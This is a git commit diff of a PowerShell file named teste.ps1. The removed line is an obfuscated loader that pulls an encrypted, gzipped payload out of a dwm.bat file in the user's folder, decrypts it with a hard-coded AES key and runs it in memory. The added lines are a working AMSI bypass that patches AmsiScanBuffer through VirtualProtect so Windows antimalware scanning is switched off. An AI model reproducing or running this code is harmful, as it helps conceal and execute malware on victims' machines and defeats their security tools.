0d638fba08e560cca96eed6904f766aa857ed0e6
latencyx <snoopbrgg00@gmail.com>
2025-01-18 03:58:14 -0800

    Update teste.ps1

--- teste.ps1
+++ teste.ps1
@@ -1,1 +1,47 @@
-function ofrwhdvcfrmcbfdecthkdoxfu($param_var){	$aes_var=[System.Security.Cryptography.Aes]::Create();	$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;	$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	$aes_var.Key=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('b+pPUWUpTqop+jhyZMypMjQ2gwKcG4KDhMVNNQaB7Lo=');	$aes_var.IV=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('7QusvcmaEgxRNYN5cSRdhw==');	$decryptor_var=$aes_var.CreateDecryptor();	$return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);	$decryptor_var.Dispose();	$aes_var.Dispose();	$return_var;}function iacqrbaradlkejurcxefdczhr($param_var){	IEX '$fgcrazhlcyctmnplkacstyjnt=New-Object System.IO.MABCemABCorABCySABCtrABCeaABCm(,$param_var);'.Replace('ABC', '');	IEX '$brtaqgbvymuyzaddyclrxqjot=New-Object System.IO.ABCMABCeABCmABCoABCrABCyABCSABCtABCrABCeABCaABCmABC;'.Replace('ABC', '');	IEX '$tbwoyhxoyyiollsbynbunkazo=New-Object System.IO.CABComABCprABCeABCssABCioABCn.ABCGZABCipABCStABCreABCamABC($fgcrazhlcyctmnplkacstyjnt, [IO.CABComABCprABCesABCsiABConABC.CoABCmpABCreABCssABCiABCoABCnABCMode]::DABCeABCcABCompABCreABCss);'.Replace('ABC', '');	$tbwoyhxoyyiollsbynbunkazo.CopyTo($brtaqgbvymuyzaddyclrxqjot);	$tbwoyhxoyyiollsbynbunkazo.Dispose();	$fgcrazhlcyctmnplkacstyjnt.Dispose();	$brtaqgbvymuyzaddyclrxqjot.Dispose();	$brtaqgbvymuyzaddyclrxqjot.ToArray();}function bkterqbarymfdvrfefkvizjcd($param_var,$param2_var){		IEX '$uwxvvkhehxefgaexjbbuonqtqzciufibwadkztdo=[System.RABCeABCflABCectABCioABCn.ABCAsABCseABCmbABClABCyABC]::LABCoABCaABCdABC([byte[]]$param_var);'.Replace('ABC', '');	IEX '$bkennvsnwxdjyezhfeewizkbpcifwtxqxnteidfvgplwbzdsaw=$uwxvvkhehxefgaexjbbuonqtqzciufibwadkztdo.ABCEABCnABCtABCrABCyABCPABCoABCiABCnABCtABC;'.Replace('ABC', '');	IEX '$bkennvsnwxdjyezhfeewizkbpcifwtxqxnteidfvgplwbzdsaw.ABCIABCnABCvABCoABCkABCeABC($null, $param2_var);'.Replace('ABC', '');}$mpxbbgbgkxaopzabwufhgkyse = $env:USERNAME;$dolunbouhqtjnthbriawtxnfk = 'C:\Users\' + $mpxbbgbgkxaopzabwufhgkyse + '\dwm.bat';$host.UI.RawUI.WindowTitle = $dolunbouhqtjnthbriawtxnfk;$qbaeiprmtoavhkhsiphivtxzh=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')($dolunbouhqtjnthbriawtxnfk).Split([Environment]::NewLine);foreach ($wda in $qbaeiprmtoavhkhsiphivtxzh) {	if ($wda.StartsWith('::'))	{		$lifwo=$wda.Substring(2);		break;	}}$xpxwjvbwotdailcxisnllatry=[string[]]$lifwo.Split('\');IEX '$ppxmhvtioockceblkqzngyowu=iacqrbaradlkejurcxefdczhr (ofrwhdvcfrmcbfdecthkdoxfu ([ABCCABCoABCnABCvABCeABCrt]::ABCFABCrABCoABCmABCBABCaABCse6ABC4ABCSABCtABCriABCnABCgABC($xpxwjvbwotdailcxisnllatry[0])));'.Replace('ABC', '');IEX '$jiofswwgxufdkgxjrtwanfnlz=iacqrbaradlkejurcxefdczhr (ofrwhdvcfrmcbfdecthkdoxfu ([ABCCABCoABCnABCvABCeABCrABCt]::ABCFABCrABCoABCmABCBABCaABCsABCeABC6ABC4ABCSABCtrABCiABCnABCg($xpxwjvbwotdailcxisnllatry[1])));'.Replace('ABC', '');bkterqbarymfdvrfefkvizjcd $ppxmhvtioockceblkqzngyowu $null;bkterqbarymfdvrfefkvizjcd $jiofswwgxufdkgxjrtwanfnlz (,[string[]] ('%ABC'));
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+     Equals('System.dll')
+     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+@($moduleName)), $functionName))
+}
+
+
+function getDelegateType {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
+     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
+    AutoClass', [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+[System.Reflection.CallingConventions]::Standard, $func).
+     SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
+$func). SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+
+$a="A"
+$b="msiS"
+$c="canB"
+$d="uffer"
+[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
